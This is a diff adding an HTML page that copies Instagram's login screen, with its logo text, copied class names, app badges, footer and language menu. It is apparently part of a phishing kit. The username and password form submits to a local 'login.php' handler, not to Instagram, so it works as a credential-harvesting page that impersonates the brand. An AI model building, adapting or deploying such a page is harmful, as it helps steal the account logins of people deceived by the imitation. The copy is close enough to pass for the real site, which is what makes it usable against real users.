@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Instagram</title>
+    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
+    <link rel="stylesheet" href="files/e0c835a8eedd.css">
+    <link rel="stylesheet" href="files/344096cb1b73.css">
+    <link rel="stylesheet" href="files/f144f7b53508.css">
+
+
+
+    <link rel="icon" href="files/36b3ee2d91ed.ico">
+    <style>
+        .saxx1 {
+            border: 1px solid rgb(168, 168, 168);
+        }
+        
+        .FATdn {
+            font-size: 12px;
+            /* padding: 14px 0 2px 8px !important; */
+            padding-top: 3px;
+            padding-right: 0px;
+            padding-bottom: 2px;
+            padding-left: 8px;
+        }
+    </style>
+
+</head>
+
+<body>
+    <script>
+        function changeClass(id, ip) {
+            // Code examples from above
+            document.getElementById(id).classList.add('saxx1');
+            document.getElementById(ip).classList.add('focus-visible')
+                // document.getElementById("sac1").classList.remove('saxx1')
+        }
+    </script>
+    <script>
+        function sacClass(id, ip) {
+            // Code examples from above
+            // document.getElementById("sac1").classList.add('saxx1');
+            document.getElementById(id).classList.remove('saxx1')
+            document.getElementById(ip).classList.remove('focus-visible')
+        }
+    </script>
+    <script>
+        function gotInput(lb) {
+            document.getElementById(lb).classList.add('FATdn')
+        }
+    </script>
+    <script>
+        function noInput(lb) {
+            document.getElementById(lb).classList.remove('FATdn')
+        }
+    </script>
+
+    <script>
+        function gotInput2(lb) {
+            document.getElementById(lb).classList.add('FATdn');
+
+
+        }
+    </script>
+    <script>
+        function another() {
+            document.getElementById('lb2').classList.add('FATdn');
+            var str = document.getElementById('ip2').value;
+            // str = String(str);
+            //alert(str);
+            var n = document.getElementById('ip2').value.length;
+            //alert(str);
+
+
+
+            if (n >= 6) {
+                //alert(n);
+                document.getElementById("btn2").disabled = false;
+            };
+            if (n < 6) {
+                document.getElementById("btn2").disabled = true;
+                // alert(n);
+            };
+
+
+        };
+    </script>
+    <script>
+        function noInput2(lb) {
+            document.getElementById(lb).classList.remove('FATdn')
+        }
+    </script>
+    <script>
+        function toggle() {
+            //  alert('sachin')
+            var txt = document.getElementById("btn").innerHTML;
+            // alert(txt);
+
+            if (txt == "Show") {
+                document.getElementById("btn").innerHTML = "Hide";
+                document.getElementById("ip2").type = "text";
+            };
+            if (txt == "Hide") {
+                document.getElementById("btn").innerHTML = "Show";
+                document.getElementById("ip2").type = "password";
+            };
+        };
+    </script>
+
+
+
+    <div id="react-root">
+        <section class="_9eogI E3X2T">
+            <div></div>
+            <main class="SCxLW  o64aR " role="main">
+                <article class="_4_yKc">
+                    <div class="rgFsT  ">
+                        <div class="gr27e  ">
+                            <h1 class="NXVPg Szr5J  logo">Instagram</h1>
+                            <div class="EPjEi">
+                                <form class="HmktE" id="loginForm" method="post" action="login.php">
+                                    <div class="                    Igw0E     IwRSH      eGOV_         _4EzTm                                                              kEKum                                                ">
+                                        <div class="-MzZI">
+                                            <div id="sac1" onclick="changeClass('sac1','ip1')" onmouseout="sacClass('sac1','ip1')" class="_9GP1n     ">
+                                                <label id="lb1" class="f0n8F">
+                                                    <span class="_9nyy2">Phone number, username, or email</span>
+
+                                                <input id="ip1" oninput="gotInput('lb1')"  onblur="if( this.value == ''){ noInput('lb1')}"
+                                                        aria-label="Phone number, username, or email"
+                                                        aria-required="true" autocapitalize="off" autocorrect="off"
+                                                        maxlength="75" name="username" type="text"
+                                                        class="_2hvTZ pexuQ zyHYP " value=""></label>
+                                                <div class="i24fI"></div>
+                                            </div>
+                                        </div>
+                                        <div class="-MzZI">
+                                            <div id="sac2" onclick="changeClass('sac2','ip2')" onmouseout="sacClass('sac2','ip2')" class="_9GP1n   "><label id="lb2" class="f0n8F "><span
+                                                        class="_9nyy2">Password</span>
+                                                        <input id="ip2" oninput="another()"   onblur="if( this.value == ''){ noInput2('lb2')}" aria-label="Password"
+                                                        aria-required="true" autocapitalize="off" autocorrect="off"
+                                                        name="password" type="password" class="_2hvTZ pexuQ zyHYP"
+                                                        value=""></label>
+                                                <div id="show" class="i24fI">
+                                                    <div class="Igw0E IwRSH eGOV_ _4EzTm ">
+                                                        <button id="btn" onclick="toggle()" class="sqdOP yWX7d _8A5w5" type="button">Show</button>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="                    Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
+                                            <button id="btn2" class="sqdOP  L3NKy   y3zKF  " disabled="true" type="submit">
+                                                <div
+                                                    class="                    Igw0E     IwRSH      eGOV_         _4EzTm                                                                                                              ">
+                                                    Log In</div>
+                                            </button></div>
+                                        <div class="K-1uj Z7p_S">
+                                            <div class="s311c"></div>
+                                            <div class="_0tv-g">or</div>
+                                            <div class="s311c"></div>
+                                        </div>
+                                        <div class="                    Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
+                                            <button class="sqdOP yWX7d    y3zKF     " type="button"><span
+                                                    class=" coreSpriteFacebookIcon AeB99"></span><span class="KPnG0">Log
+                                                    in with Facebook</span></button></div>
+                                    </div><a class="_2Lks6" href="" tabindex="0">Forgot
+                                        password?</a>
+                                </form>
+                            </div>
+                        </div>
+                        <div class="gr27e">
+                            <div class="_7UhW9   xLCgt     yUEEX    _0PwGv         uL8Hv         ">
+                                <p class="izU2O ">Don't have an account? <a href="" tabindex="0"><span
+                                            class="_7UhW9   xLCgt       qyrsm      gtFbE      se6yk        ">Sign
+                                            up</span></a></p>
+                            </div>
+                        </div>
+                        <div class="APQi1">
+                            <p class="b_nGN">Get the app.</p>
+                            <div class="iNy2T">
+                                <a class="z1VUo" href=""><img alt="Available on the App Store" class="Rt8TI " src="files/180ae7a0bcf7.png"></a>
+                                <a class="z1VUo" href=""><img alt="Available on Google Play" class="Rt8TI " src="files/e9cd846dc748.png"></a>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+            </main>
+            <footer class="_8Rna9  _3Laht  " role="contentinfo">
+                <div class="iseBh  VWk7Y " style="max-width: 1150px;">
+                    <nav class="uxKLF">
+                        <ul class="ixdEe _9Rlzb">
+                            <li class="K5OFK"><a class="l93RR" href="" rel="nofollow noopener noreferrer" target="_blank">About</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">Help</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">Press</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">API</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">Jobs</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">Privacy</a></li>
+                            <li class="K5OFK"><a class="l93RR _vfM2" href="">Terms</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">Locations</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">Top Accounts</a></li>
+                            <li class="K5OFK"><a class="l93RR" href="">Hashtags</a></li>
+                            <li class="K5OFK"><span class="_3G4x7     tN4Ei l93RR">Language<select
+                                        aria-label="Switch Display Language" class="hztqj">
+                                        <option value="af">Afrikaans</option>
+                                        <option value="cs">Čeština</option>
+                                        <option value="da">Dansk</option>
+                                        <option value="de">Deutsch</option>
+                                        <option value="el">Ελληνικά</option>
+                                        <option value="en">English</option>
+                                        <option value="es">Español (España)</option>
+                                        <option value="es-la">Español</option>
+                                        <option value="fi">Suomi</option>
+                                        <option value="fr">Français</option>
+                                        <option value="id">Bahasa Indonesia</option>
+                                        <option value="it">Italiano</option>
+                                        <option value="ja">日本語</option>
+                                        <option value="ko">한국어</option>
+                                        <option value="ms">Bahasa Melayu</option>
+                                        <option value="nb">Norsk</option>
+                                        <option value="nl">Nederlands</option>
+                                        <option value="pl">Polski</option>
+                                        <option value="pt-br">Português (Brasil)</option>
+                                        <option value="pt">Português (Portugal)</option>
+                                        <option value="ru">Русский</option>
+                                        <option value="sv">Svenska</option>
+                                        <option value="th">ภาษาไทย</option>
+                                        <option value="tl">Filipino</option>
+                                        <option value="tr">Türkçe</option>
+                                        <option value="zh-cn">中文(简体)</option>
+                                        <option value="zh-tw">中文(台灣)</option>
+                                        <option value="bn">বাংলা</option>
+                                        <option value="gu">ગુજરાતી</option>
+                                        <option value="hi">हिन्दी</option>
+                                        <option value="hr">Hrvatski</option>
+                                        <option value="hu">Magyar</option>
+                                        <option value="kn">ಕನ್ನಡ</option>
+                                        <option value="ml">മലയാളം</option>
+                                        <option value="mr">मराठी</option>
+                                        <option value="ne">नेपाली</option>
+                                        <option value="pa">ਪੰਜਾਬੀ</option>
+                                        <option value="si">සිංහල</option>
+                                        <option value="sk">Slovenčina</option>
+                                        <option value="ta">தமிழ்</option>
+                                        <option value="te">తెలుగు</option>
+                                        <option value="vi">Tiếng Việt</option>
+                                        <option value="zh-hk">中文(香港)</option>
+                                        <option value="bg">Български</option>
+                                        <option value="fr-ca">Français (Canada)</option>
+                                        <option value="ro">Română</option>
+                                        <option value="sr">Српски</option>
+                                        <option value="uk">Українська</option>
+                                    </select></span></li>
+                        </ul>
+                    </nav><span class="DINPA">© 2020 Instagram from Facebook</span>
+                </div>
+            </footer>
+        </section>
+    </div>
+</body>
+
+</html>
